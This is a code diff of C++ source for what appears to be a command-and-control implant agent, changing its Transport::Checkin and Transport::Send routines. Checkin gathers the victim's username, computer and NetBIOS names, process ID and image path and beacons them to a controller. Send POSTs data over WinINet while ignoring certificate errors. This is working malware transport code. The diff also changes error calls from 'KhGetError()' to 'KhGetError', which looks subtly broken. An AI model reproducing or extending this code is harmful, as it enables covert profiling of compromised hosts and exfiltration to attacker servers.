@@ -5,8 +5,8 @@ using namespace Root;
 auto DECLFN Transport::Checkin(
     VOID
 ) -> BOOL {
-    PPACKAGE CheckinPkg = Kh->Pkg->Checkin();
-    PPARSER  CheckinPsr = (PPARSER)Kh->Hp->Alloc( sizeof( PARSER ) );
+    PPACKAGE CheckinPkg = Self->Pkg->Checkin();
+    PPARSER  CheckinPsr = (PPARSER)Self->Hp->Alloc( sizeof( PARSER ) );
     
     KhDbg( "start checkin routine" );
 
@@ -16,46 +16,45 @@ auto DECLFN Transport::Checkin(
     PCHAR  OldUUID = NULL;
     ULONG  UUIDsz  = 36;
 
-    KhDbg( "%s", Kh->Session.AgentID );
+    KhDbg( "%s", Self->Session.AgentID ); 
+    KhDbg( "%X", Self->Machine.OsArch ); 
 
-    Kh->Pkg->AddPad( CheckinPkg, UC_PTR( Kh->Session.AgentID ), 36 );
+    Self->Pkg->Pad( CheckinPkg, UC_PTR( Self->Session.AgentID ), 36 );
+    Self->Pkg->Byte( CheckinPkg, Self->Machine.OsArch );
+    Self->Pkg->Str( CheckinPkg, Self->Machine.UserName );
+    Self->Pkg->Str( CheckinPkg, Self->Machine.CompName );
+    Self->Pkg->Str( CheckinPkg, Self->Machine.NetBios );
+    Self->Pkg->Int32( CheckinPkg, Self->Session.ProcessID );
+    Self->Pkg->Str( CheckinPkg, Self->Session.ImagePath );
+    Self->Pkg->Str( CheckinPkg, "0.0.0.0" );
 
-    Kh->Pkg->AddByte( CheckinPkg, Kh->Machine.OsArch );
-
-    Kh->Pkg->AddString( CheckinPkg, Kh->Machine.UserName );
-    Kh->Pkg->AddString( CheckinPkg, Kh->Machine.CompName );
-    Kh->Pkg->AddString( CheckinPkg, Kh->Machine.NetBios );
-    Kh->Pkg->AddInt32( CheckinPkg, Kh->Session.ProcessID );
-    Kh->Pkg->AddString( CheckinPkg, Kh->Session.ImagePath );
-    Kh->Pkg->AddString( CheckinPkg, "0.0.0.0" );
-
-    Kh->Pkg->Transmit( CheckinPkg, &Data, &Length );
+    Self->Pkg->Transmit( CheckinPkg, &Data, &Length );
 
     KhDbg( "transmited return %p [%d bytes]", Data, Length );
 
-    Kh->Psr->New( CheckinPsr, Data, Length );
+    Self->Psr->New( CheckinPsr, Data, Length );
     if ( !CheckinPsr->Original ) return FALSE;
 
-    OldUUID = (PCHAR)Kh->Psr->Pad( CheckinPsr, 36 );
-    NewUUID = (PCHAR)Kh->Psr->Pad( CheckinPsr, 36 );
+    OldUUID = (PCHAR)Self->Psr->Pad( CheckinPsr, 36 );
+    NewUUID = (PCHAR)Self->Psr->Pad( CheckinPsr, 36 );
 
     KhDbg( "old uuid: %s", OldUUID );
     KhDbg( "new uuid: %s", NewUUID );
 
     if ( !NewUUID ) { INT3BRK; }
 
-    Kh->Session.AgentID = A_PTR( Kh->Hp->Alloc( UUIDsz ) );
-    Mem::Copy( Kh->Session.AgentID, NewUUID, UUIDsz );
+    Self->Session.AgentID = A_PTR( Self->Hp->Alloc( UUIDsz ) );
+    Mem::Copy( Self->Session.AgentID, NewUUID, UUIDsz );
 
-    if ( ( NewUUID && Str::CompareA( NewUUID, Kh->Session.AgentID ) != 0 ) ) {
-        Kh->Session.Connected = TRUE;
+    if ( ( NewUUID && Str::CompareA( NewUUID, Self->Session.AgentID ) != 0 ) ) {
+        Self->Session.Connected = TRUE;
     }
 
-    KhDbg( "set uuid: %s", Kh->Session.AgentID );
+    KhDbg( "set uuid: %s", Self->Session.AgentID );
 
     KhDbg( "checkin routine done..." );
 
-    Kh->Psr->Destroy( CheckinPsr );
+    Self->Psr->Destroy( CheckinPsr );
 
     return TRUE;
 }
@@ -89,20 +88,20 @@ auto DECLFN Transport::Send(
 
     HttpFlags = INTERNET_FLAG_RELOAD;
 
-    hSession = Kh->Wininet.InternetOpenW(   
-        Kh->Tsp->Web.UserAgent, HttpAccessType,
+    hSession = Self->Wininet.InternetOpenW(   
+        Self->Tsp->Web.UserAgent, HttpAccessType,
         HttpProxy, 0, 0
     );
-    if ( !hSession ) { KhDbg( "last error: %d", KhGetError() ); goto _KH_END; }
+    if ( !hSession ) { KhDbg( "last error: %d", KhGetError ); goto _KH_END; }
 
-    hConnect = Kh->Wininet.InternetConnectW(
-        hSession, Kh->Tsp->Web.Host, Kh->Tsp->Web.Port,
-        Kh->Tsp->Web.ProxyUsername, Kh->Tsp->Web.ProxyPassword,
+    hConnect = Self->Wininet.InternetConnectW(
+        hSession, Self->Tsp->Web.Host, Self->Tsp->Web.Port,
+        Self->Tsp->Web.ProxyUsername, Self->Tsp->Web.ProxyPassword,
         INTERNET_SERVICE_HTTP, 0, 0
     );
-    if ( !hConnect ) { KhDbg( "last error: %d", KhGetError() ); goto _KH_END; }
+    if ( !hConnect ) { KhDbg( "last error: %d", KhGetError ); goto _KH_END; }
 
-    if ( Kh->Tsp->Web.Secure ) {
+    if ( Self->Tsp->Web.Secure ) {
         HttpFlags |= INTERNET_FLAG_SECURE;
         OptFlags   = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
             SECURITY_FLAG_IGNORE_CERT_DATE_INVALID   |
@@ -111,22 +110,22 @@ auto DECLFN Transport::Send(
             SECURITY_FLAG_IGNORE_WEAK_SIGNATURE;
     }        
 
-    hRequest = Kh->Wininet.HttpOpenRequestW( 
-        hConnect, L"POST", Kh->Tsp->Web.EndPoint, NULL, 
+    hRequest = Self->Wininet.HttpOpenRequestW( 
+        hConnect, L"POST", Self->Tsp->Web.EndPoint, NULL, 
         NULL, NULL, HttpFlags, 0 
     );
-    if ( !hRequest ) { KhDbg( "last error: %d", KhGetError() ); goto _KH_END; }
+    if ( !hRequest ) { KhDbg( "last error: %d", KhGetError ); goto _KH_END; }
 
-    Kh->Wininet.InternetSetOptionW( hRequest, INTERNET_OPTION_SECURITY_FLAGS, &OptFlags, sizeof( OptFlags ) );
+    Self->Wininet.InternetSetOptionW( hRequest, INTERNET_OPTION_SECURITY_FLAGS, &OptFlags, sizeof( OptFlags ) );
 
-    Success = Kh->Wininet.HttpSendRequestW(
-        hRequest, Kh->Tsp->Web.HttpHeaders,
-        Str::LengthW( Kh->Tsp->Web.HttpHeaders ),
+    Success = Self->Wininet.HttpSendRequestW(
+        hRequest, Self->Tsp->Web.HttpHeaders,
+        Str::LengthW( Self->Tsp->Web.HttpHeaders ),
         Data, Size
     );
-    if ( !Success ) { KhDbg( "last error: %d", KhGetError() ); goto _KH_END; }
+    if ( !Success ) { KhDbg( "last error: %d", KhGetError ); goto _KH_END; }
 
-    Kh->Wininet.HttpQueryInfoW(
+    Self->Wininet.HttpQueryInfoW(
         hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
         &HttpStatusCode, &HttpStatusSize, NULL
     );
@@ -134,37 +133,37 @@ auto DECLFN Transport::Send(
     KhDbg( "http status code %d", HttpStatusCode );
 
     if ( Success ) {
-        Success = Kh->Wininet.HttpQueryInfoW(
+        Success = Self->Wininet.HttpQueryInfoW(
             hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER,
             &ContentLength, &ContentLenLen, NULL
         );
         if ( !Success ) { 
-            if ( KhGetError() == 12150 ) {
+            if ( KhGetError == 12150 ) {
                 KhDbg( "content-length header not found" );
             } else {
-                KhDbg( "last error: %d", KhGetError() );
+                KhDbg( "last error: %d", KhGetError );
             }
         }
 
         RespSize = ContentLength;
         
         if ( RespSize ) {
-            RespBuffer = C_PTR( Kh->Hp->Alloc( RespSize + 1 ) );
-            Kh->Wininet.InternetReadFile( hRequest, RespBuffer, RespSize, &BytesRead );
+            RespBuffer = C_PTR( Self->Hp->Alloc( RespSize + 1 ) );
+            Self->Wininet.InternetReadFile( hRequest, RespBuffer, RespSize, &BytesRead );
         } else {
             RespSize   = 0;
             RespBuffer = NULL;
-            TmpBuffer  = C_PTR( Kh->Hp->Alloc( BEG_BUFFER_LENGTH ) );
+            TmpBuffer  = C_PTR( Self->Hp->Alloc( BEG_BUFFER_LENGTH ) );
 
             do {
-                Kh->Wininet.InternetReadFile( hRequest, TmpBuffer, BEG_BUFFER_LENGTH, &BytesRead );
+                Self->Wininet.InternetReadFile( hRequest, TmpBuffer, BEG_BUFFER_LENGTH, &BytesRead );
 
                 RespSize += BytesRead;
 
                 if ( !RespBuffer ) {
-                    RespBuffer = C_PTR( Kh->Hp->Alloc( RespSize ) );
+                    RespBuffer = C_PTR( Self->Hp->Alloc( RespSize ) );
                 } else {
-                    RespBuffer = C_PTR( Kh->Hp->ReAlloc( RespBuffer, RespSize ) );
+                    RespBuffer = C_PTR( Self->Hp->ReAlloc( RespBuffer, RespSize ) );
                 }
 
                 Mem::Copy( C_PTR( U_PTR( RespBuffer ) + ( RespSize - BytesRead ) ), TmpBuffer, BytesRead );
@@ -172,7 +171,7 @@ auto DECLFN Transport::Send(
                 
             } while ( BytesRead > 0 );
             
-            Kh->Hp->Free( TmpBuffer, BEG_BUFFER_LENGTH );
+            Self->Hp->Free( TmpBuffer, BEG_BUFFER_LENGTH );
         }
         
         KhDbg( "request: at %p [%d bytes]\n", RespBuffer, RespSize );
@@ -182,7 +181,7 @@ auto DECLFN Transport::Send(
 
         Success = TRUE;            
     } else {
-        if ( KhGetError() == 12029 ) {
+        if ( KhGetError == 12029 ) {
             return FALSE;
         } else {
             return TRUE;
@@ -192,9 +191,9 @@ auto DECLFN Transport::Send(
     }
 
 _KH_END:
-    if ( hSession ) Kh->Wininet.InternetCloseHandle( hSession );
-    if ( hConnect ) Kh->Wininet.InternetCloseHandle( hConnect );
-    if ( hRequest ) Kh->Wininet.InternetCloseHandle( hRequest );
+    if ( hSession ) Self->Wininet.InternetCloseHandle( hSession );
+    if ( hConnect ) Self->Wininet.InternetCloseHandle( hConnect );
+    if ( hRequest ) Self->Wininet.InternetCloseHandle( hRequest );
 
     return Success;
 }
